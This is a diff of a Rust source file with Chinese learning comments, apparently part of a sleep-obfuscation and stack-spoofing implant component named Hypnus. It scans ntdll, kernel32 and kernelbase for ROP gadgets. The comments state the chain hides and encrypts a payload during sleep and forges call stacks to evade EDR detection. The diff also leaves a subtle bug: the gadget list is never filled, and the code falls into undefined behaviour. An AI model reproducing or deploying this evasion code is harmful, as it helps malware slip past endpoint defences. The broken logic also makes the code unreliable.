@@ -1,7 +1,7 @@
-#![allow(unused)]
+//#![allow(unused)]
 
 use crate::config::Config;
-use crate::{cfg, debug_log, stealth_bail};
+use crate::stealth_bail;
 use crate::{
     error::{HypnusError, Result},
     spoof::Unwind,
@@ -11,12 +11,10 @@ use core::ffi::c_void;
 use core::slice::from_raw_parts;
 use obfstr::obfstr as s;
 use puerto::helper::PE;
-use puerto::types::IMAGE_RUNTIME_FUNCTION;
+use puerto::types::{CONTEXT, IMAGE_RUNTIME_FUNCTION};
 
 // 本模块在项目中作用:主线程进入休眠时,要构建一条ROP执行链(修改内存属性->加密->延时->解密).为了让执行流能在os dll中合法的反复横跳,不能直接使用call敏感api.
-// 而是在合法的os dll(这里使用kernerlbase.dll)的.text中(非leaf function且在.pdata注册的范围中)找到jmp [rbx] gadget.
-
-
+// 而是在合法的os dll(这里使用kernerlbase.dll)的.text中(非leaf function且在.pdata注册的范围中)找到用于中转的jmp <reg>以及ROP链收尾的jmp [rbx] gadget.
 
 // 通过串联多组 [AddRspXGadget ->伪造宿主函数栈帧 -> 目标函数参数与入口] 结构来构建真实的 ROP 链：
 // 1. 调用 VirtualProtect 将 Payload内存修改为可读写（RW）属性，返回地址指向对应的 AddRspX1Gadget；
@@ -26,8 +24,7 @@ use puerto::types::IMAGE_RUNTIME_FUNCTION;
 // 5. 调用 VirtualProtect 恢复 Payload内存为可执行（RX）属性，返回地址指向最后的 AddRspX5Gadget；
 // 6. 最终落入动态生成的恢复 Gadget（`mov rsp, rbp;ret`）。通过将原始栈指针从 rbp 还原到 rsp，瞬间一刀抛弃所有伪造的 ROP栈帧，完美闭环并恢复主线程的真实环境
 
-
-// 本文件的作用就是去os 中搜寻/匹配然后提供这些碎片的地址
+// 本文件的作用就是去dll中搜寻/匹配然后提供这些碎片的地址
 
 /// represent win64 general-purpose register suitable for indirect jumps 间接跳转的通用寄存器
 ///
@@ -46,7 +43,7 @@ pub enum Reg {
 /// list of short jump opcode patterns mapped to their corresponding register
 ///
 /// &[(&[u8], Reg)]对数组的引用,该数组的元素类型是(&[u8], Reg).其中第一个元素类型是&[u8](字节 slice),第二个是enum Reg
-/// 
+///
 /// 作用:利用jmp特性在不同敏感api之间跳转
 const JMP_GADGETS: &[(&[u8], Reg)] = &[
     // jmp rdi:跳转到rip存储的地址
@@ -74,30 +71,62 @@ pub struct Gadget {
 }
 
 impl Gadget {
-
     /// Searches for usable `jmp <reg>` gadgets in memory based on predefined opcodes.
     pub fn new(cfg: &Config) -> Self {
-        /// 可以手动分配栈,代替源码中使用的Vec,达到极致隐蔽.win的默认栈大小一般是1Mb,这里很小,几乎不会出现栈溢出
+        // 可以手动分配栈,代替源码中使用的Vec,达到极致隐蔽.win的默认栈大小一般是1Mb,这里很小,几乎不会出现栈溢出
         let mut gadgets: Vec<Gadget> = Vec::new();
 
-        /// 通过Config.rs/Config获取要查找gadget的dll的基址
-        /// as *const u8以1字节为单位读取该指针指向的数据.源地址的指针仍然是u64大小的(win64下指针和地址永远64位)
+        // 通过Config.rs/Config获取要查找gadget的dll的基址
+        // as *const u8以1字节为单位读取该指针指向的数据.源地址的指针仍然是u64大小的(win64下指针和地址永远64位)
         let modules = [
             cfg.modules.ntdll.as_ptr() as *const u8,
             cfg.modules.kernel32.as_ptr() as *const u8,
             cfg.modules.kernelbase.as_ptr() as *const u8,
         ];
 
-        /// 遍历三个dll;modules是数组,modules.iter()->引用的迭代器,其每次循环产生的元素类型是& *const u8.如果将&base(base= *const u8)改为base,则base= & *const u8.后续使用base时需要解引用(*base).这称为模式匹配的对消
-        /// 但在rust 2021之后,数组实现了IntoIterator ,这里可由源码&base in modules.iter().改为base in modules:base的类型就是*const u8
-        for base in modules {}
+        // 遍历三个dll;modules是数组,modules.iter()->引用的迭代器,其每次循环产生的元素类型是& *const u8.如果将&base(base= *const u8)改为base,则base= & *const u8.后续使用base时需要解引用(*base).这称为模式匹配的对消
+        // 但在rust 2021之后,数组实现了IntoIterator ,这里可由源码&base in modules.iter().改为base in modules:base的类型就是*const u8
+        //
+        // base是modules中代表三个dll的基址
+        for base in modules {
+            if let Some(range) = get_text_section(base as *mut c_void) {
+                find(base, range).first().copied();
+            }
+        }
 
-        /// 函数返回前,主动将栈上数据擦除
-        todo!()
+        // shuffle to reduce pattern predictability
+        shuffle(&mut gadgets);
+
+        if let Some(gadget) = gadgets.first().copied() {
+            gadget
+        } else {
+            // SAFETY: `gadgets` is guaranteed to be non-empty at this point due to prior validation.
+            // If this invariant is ever broken, this will invoke undefined behavior
+            unsafe { core::hint::unreachable_unchecked() }
+        }
+
+        // 函数返回前,主动将栈上数据擦除.这一功能是否需要?
+    }
+
+    /// injects this gadget into a given thread CONTEXT.Sets the rip to the gadget address and writes the target value into the appropriate general-purpose register for indirect jump
+    ///
+    /// (注意是一个private函数)将rip指向gadget(如 jmp 10),然后将target(如NtProjectViretualMemory)地址存入对应的寄存器(如r10):当cpu恢复执行,会先执行jmp r10进而调用target的函数.此为ROP链的标准用法
+    fn apply(&self, ctx: &mut CONTEXT, target: u64) {
+        // 将找到的Gaddet地址存入当前Context的rip.addr在struct Gadget中
+        ctx.Rip = self.addr;
+
+        // 匹配gadget中Reg,将真正要执行的函数地址放入对应的寄存器(如 gadget是r10,这里就将target放入r10)
+        match self.reg {
+            Reg::Rdi => ctx.Rdi = target,
+            Reg::R10 => ctx.R10 = target,
+            Reg::R11 => ctx.R11 = target,
+            Reg::R12 => ctx.R12 = target,
+            Reg::R13 => ctx.R13 = target,
+            Reg::R14 => ctx.R14 = target,
+            Reg::R15 => ctx.R15 = target,
+        }
     }
 }
-
-/// 对fn find()找到的jmp <register> gadgets再次在.pdata中过滤/筛选. 详见注释
 
 /// Scans the provided memory region for `jmp <reg>` instruction patterns.
 /// Only one gadget per register is recorded to avoid redundancy冗余.
@@ -205,13 +234,13 @@ pub enum GadgetKind {
 
 impl GadgetKind {
     /// scans the specified image base for a supported control-flow gadget
-    /// 
+    ///
     /// 作用:在该pe文件的整个.pdata节区中detect探测决定使用GadgetKind的call或jmp模式.由于GadgetKind是一个无状态的enum,不能存储地址.后续冗余设计了resolve()用于实际存储找到的gadget地址.可以改用GadgetKind::Call(*const u8,u32)一次性实现
     pub fn detect(base: *mut c_void) -> Result<Self> {
         // 抽象一个PE文件,用一个结构体代表PE文件,该结构体只有一个raw pointer.
         let pe = Unwind::new(PE::parse(base));
 
-        /// 解构exception table
+        // 解构exception table
         let Some(tables) = pe.entries() else {
             stealth_bail!(
                 HypnusError::ExceptionTableNotFound,
@@ -220,7 +249,7 @@ impl GadgetKind {
         };
 
         // tables代表该 PE 文件中  .pdata  段里所有注册的  IMAGE_RUNTIME_FUNCTION结构体数组
- // 0xFF 0x13 : call rbx
+        // 0xFF 0x13 : call rbx
         // 0xFF 0x23 : jmp  rbx
         // 在image_runtime_function异常目录中找到符合要求的gadget.为啥要找rbx.见注释3
         if scan_runtime(base, &[0xFF, 0x13], tables).is_some() {
@@ -228,53 +257,77 @@ impl GadgetKind {
         } else if scan_runtime(base, &[0xFF, 0x23], tables).is_some() {
             Ok(GadgetKind::Jmp)
         } else {
-            stealth_bail!(HypnusError::SuitableCallJmpRbxGadgetNotFound,"no suitable call/jmp [rbx] gadget found in image")
+            stealth_bail!(
+                HypnusError::SuitableCallJmpRbxGadgetNotFound,
+                "no suitable call/jmp [rbx] gadget found in image"
+            )
         }
     }
 
-/// Resolves the actual memory address of the detected gadget in `kernelbase.dll`.
-/// 
-/// detect之后再kernelbase.dll中找到合适的gadget,返回对应的地址和其宿主函数栈帧大小
-pub fn resolve(&self,cfg:&Config)->Result<(*mut u8,u32)> {
+    /// Resolves the actual memory address of the detected gadget in `kernelbase.dll`.
+    ///
+    /// detect之后再kernelbase.dll中找到合适的gadget,返回对应的地址和其宿主函数栈帧大小
+    pub fn resolve(&self, cfg: &Config) -> Result<(*mut u8, u32)> {
+        // PE::parse设计为代表一个pe文件,这里用于代表一个dll.详见注释5
+        let pe = Unwind::new(PE::parse(cfg.modules.kernelbase.as_ptr()));
 
-    // PE::parse设计为代表一个pe文件,这里用于代表一个dll.详见注释5
-    let pe =Unwind::new(PE::parse(cfg.modules.kernelbase.as_ptr())) ;
+        // let else解构并错误控制
+        let Some(tables) = pe.entries() else {
+            stealth_bail!(
+                HypnusError::FailedToReadImageRuntimeFunction,
+                "failed to read IMAGE_RUNTIME_FUNCTION entries from .pdata section"
+            )
+        };
 
+        //
+        match self {
+            GadgetKind::Call => {
+                let Some(res) =
+                    scan_runtime(cfg.modules.kernelbase.as_ptr(), &[0xFF, 0x13], tables)
+                else {
+                    stealth_bail!(HypnusError::NotFoundCallRbx, "missing call [rbx] gadget")
+                };
+                Ok(res)
+            }
 
-    // let else解构并错误控制
-    let Some(tables) = pe.entries()else {
-        stealth_bail!(HypnusError::FailedToReadImageRuntimeFunction,"failed to read IMAGE_RUNTIME_FUNCTION entries from .pdata section")
-    };
-
-    // 
-    match self {
-        GadgetKind::Call=>{
-            let Some(res) = scan_runtime(cfg.modules.kernelbase.as_ptr(), &[0xFF, 0x13], tables)else {
-                stealth_bail!(HypnusError::NotFoundCallRbx,"missing call [rbx] gadget")
-            };
-        }
-
-        GadgetKind::Jmp=>{
-            let Some(res)=scan_runtime(cfg.modules.kernelbase.as_ptr(), &[0xFF, 0x23], tables)else {
-                stealth_bail!(HypnusError::NotFoundJmprbx,"missing jmp [rbx] gadget")
-            };
+            GadgetKind::Jmp => {
+                let Some(res) =
+                    scan_runtime(cfg.modules.kernelbase.as_ptr(), &[0xFF, 0x23], tables)
+                else {
+                    stealth_bail!(HypnusError::NotFoundJmprbx, "missing jmp [rbx] gadget")
+                };
+                Ok(res)
+            }
         }
     }
 
-
-    todo!()
-}
-
-
-
-
-
+    /// Returns the byte sequence representing the gadget's instruction pattern.
+    /// 抛弃uwd/RestoreSynthetic转而使用自己的方式实现ROP链的收尾
+    ///
+    /// 返回一个u8数组,里面存放本函数中自定义的汇编指令opcode:在hypnus/src/spoof.rs/alloc_memory函数中,hypnus调用NtAllocateVirtualMemory在进程中分配一小块可执行内存页.之后调用bytes()把其中的opcode放入该内存页.用以取代uwd/RestoreSynthetic! 执行bytes()中的opcode,回到代码中实际的执行流
+    ///
+    /// 在构造伪造栈帧前,将当时的栈底rsp保存到rbp中.伪造栈帧被使用之后,利用本函数的opcode回到之前的执行流
+    #[inline]
+    pub fn bytes(self) -> &'static [u8] {
+        match self {
+            GadgetKind::Call => &[
+                0x48, 0x83, 0x2C, 0x24, 0x02, // sub qword ptr [rsp], 2
+                0x48, 0x89, 0xEC, // mov rsp, rbp
+                0xC3, // ret
+            ],
+            GadgetKind::Jmp => &[
+                0x48, 0x89, 0xEC, // mov rsp, rbp
+                0xC3, // ret
+            ],
+        }
+    }
 }
 
 /// scans the unwind info of a PE module to locate gadgets within valid runtime functions
+/// 对fn find()找到的jmp <register> gadgets再次在.pdata中过滤/筛选. 详见注释1
 ///
 /// 作用:指定dll基址/opcode/IMAGE_RUNTIME_FUNCTION的数组/slice,从中找到所有符合的gadget,存入vec中,打乱顺序.随机返回一个gadget的VA和其宿主函数的栈帧大小
-/// 
+///
 pub fn scan_runtime<B>(
     module: *mut c_void, // dll基址
     pattern: &B,         // opcode
@@ -335,7 +388,7 @@ pub fn shuffle<T>(list: &mut [T]) {
 
     // rev()Reverses an iterator's direction
     for i in (1..list.len()).rev() {
-        // 算法,直接使用源码中的算法会不会留下痕迹,有没有必要自定义?
+        // 算法,直接使用源码中的算法会不会留下痕迹,有没有必要自定义?(没有这是glibc经典算法)
         seed = seed.wrapping_mul(1103515245).wrapping_add(12345);
         let j = seed as usize % (i + 1);
         list.swap(i, j);
@@ -344,7 +397,7 @@ pub fn shuffle<T>(list: &mut [T]) {
 
 // 注释1
 // find()和scan_runtime() 分别找到的是gadget的地址还是包含gadget函数的地址?
-// 本文件中的fn find()实现了能够跳转,scan_runtime()让edr回溯stack walk时更加安全:
+// 本文件中的fn find()为了能够跳转,在ROP执行找到的jmp <reg>时,线程没有陷入内核沉睡,EDR不会也来不及在这个瞬间去抓取堆栈,所以代码在.text节中随便找,不需要去.pdata中查是否存在.scan_runtime()找到的jmp [rbp]以及add rsp,X是用于ROP链收尾的,此时线程在NtDelayExecution中休眠,一旦edr用RtlVirtualUnwind来回溯检查,需要伪造栈让他们处于合法的/.pdata注册过的/非叶子函数内部:
 // edr的线程堆栈审查,利用win内核的异常处理机制(通过RtlVirtualUnwind)顺着调用栈一层一层向上追溯,检查每个返回地址是否合法.如果直接使用find找到的gadgets.这里找到的gadget可能处于 函数之间对齐填充区/叶子函数内(叶子函数不调用其他函数,不开辟栈空间,没有注册.pdata).那么edr对回溯到的返回地址,在.pdata中查询时,会发现该地址不在任何注册的合法运行时函数范围内/该地址无法正常unwind
 // 1. scan_runtime():遍历.pdata,要求找到的gadget必须位于一个在系统注册了异常处理信息的,合法的非叶子函数内部.以此,当edr执行RtlVirtualUnwind时,能通过.pdata找到unwind路径,表现的像一个完全正常的系统调用
 // 2. 伪造栈还需要在栈上构造和真实函数一样的空间.find()的.text扫描只能找到内存地址,没有处理对应的栈空间信息.scan_runtime()通过uwd::ignoring_set_fpreg(module, runtime),解析对应函数UNWIND_INFO,精确计算该函数在进入时开辟的栈帧大小.这里的对应函数是:在dll中找到的包含gadget的合法的win的系统函数
@@ -362,12 +415,10 @@ pub fn shuffle<T>(list: &mut [T]) {
 // 这里的转换不是通过implicit cast隐式转换的,而是通过rust的trait method call和auto-deref自动解引用实现的
 // find()需要&[u8],B实现了AsRef<[u8]> trait.pattern调用as_ref()时,会自动解引用返回&[u8]
 
-
 // 注释3
 // 在进行stack spoof/ROP链构造时,几乎都会选择使用rbx
 // 1. rbx是非易失性寄存器Non-volatile / Preserved Registers(RBX 、 RBP 、 RDI 、 RSI 、 R12 ~ R15):一个函数在使用这种寄存器之前,必须在prologue中将它们的值push到栈上备份,在函数epilogue前pop还原它们.且微软的调用约定保证,不管中间经历多少层系统调用,只要这层调用没有结束,rbx中的值就绝对不会改变
 // 2. rsp,rbp有固定作用;rdi,rsi在很多拷贝函数中,被隐式的当作源/目的地址寄存器,值变化频繁;R12-R15:对应的机器指令长度较长(访问R12-R15寄存器需要增加REX前缀字节),使得在系统dll中,对应的gadget较少.因此,只剩下rbx这个纯粹的、无任何特殊指令隐式绑定的通用数据暂存器,且的指令非常短
-
 
 // 注释5:为什么代表pe的结构体可以用来表示dll
 // Windows 的 DLL 加载本质是“内存映射”:硬盘上kernelbase.dll是一个二进制文件,当一个程序需要使用它时,os不会像读取一个text文件那样,将其读取缓存buffer.而是使用内存映射文件memory-mapped file技术
